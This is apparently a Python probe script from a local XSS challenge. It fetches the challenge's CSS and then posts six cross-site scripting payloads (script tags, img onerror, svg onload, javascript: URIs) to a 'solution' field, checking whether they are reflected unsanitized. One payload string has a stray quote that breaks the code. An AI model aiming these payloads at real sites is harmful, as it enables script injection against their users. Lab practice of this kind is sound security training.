import requests
import re

base_url = "http://127.0.0.1:33202"

# Fetch CSS files
css_files = [
    "/static/css/style.css",
    "/static/css/xss/xss24.css"
]

print("[*] Fetching CSS files for clues...\n")

for css_path in css_files:
    url = base_url + css_path
    try:
        response = requests.get(url, timeout=10)
        print(f"\n{'='*80}")
        print(f"CSS: {css_path}")
        print(f"Status: {response.status_code}")
        print(f"{'='*80}")
        if response.status_code == 200:
            print(response.text[:2000])  # Print first 2000 chars
            if len(response.text) > 2000:
                print(f"\n[... truncated, total length: {len(response.text)} bytes]")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching {url}: {e}")

print("\n\n" + "="*80)
print("TESTING SOLUTION PARAMETER FOR XSS")
print("="*80)

# Test if solution parameter is reflected
# First, let's try a simple XSS payload
test_payloads = [
    "<script>alert('XSS')</script>",
    '"><script>alert("XSS")</script>',
    ""><img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert`XSS`>"
]

print("\n[*] Testing various XSS payloads in solution parameter...\n")

for i, payload in enumerate(test_payloads, 1):
    print(f"\n{'-'*80}")
    print(f"Test {i}: {payload}")
    print(f"{'-'*80}")
    
    # Try POST request
    data = {'solution': payload}
    try:
        response = requests.post(f"{base_url}/page", data=data, timeout=10)
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response.text)} bytes")
        
        # Check if payload is reflected in response
        if payload in response.text:
            print(f"[!] PAYLOAD REFLECTED! The solution parameter is NOT sanitized.")
            print("\nResponse snippet:")
            
            # Find where the payload appears
            pos = response.text.find(payload)
            start = max(0, pos-100)
            end = min(len(response.text), pos+len(payload)+100)
            snippet = response.text[start:end]
            print(f"...{snippet}...")
            break
        else:
            # Check for encoded versions
            encoded_found = False
            if payload.replace('"', '&quot;') in response.text:
                print(f"[!] PAYLOAD FOUND (HTML encoded)")
                encoded_found = True
            if payload.replace('<', '&lt;') in response.text:
                print(f"[!] PAYLOAD FOUND (HTML encoded)")
                encoded_found = True
                
            if not encoded_found:
                print(f"[-] Payload not reflected or encoded")
                
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")

print("\n" + "="*80)
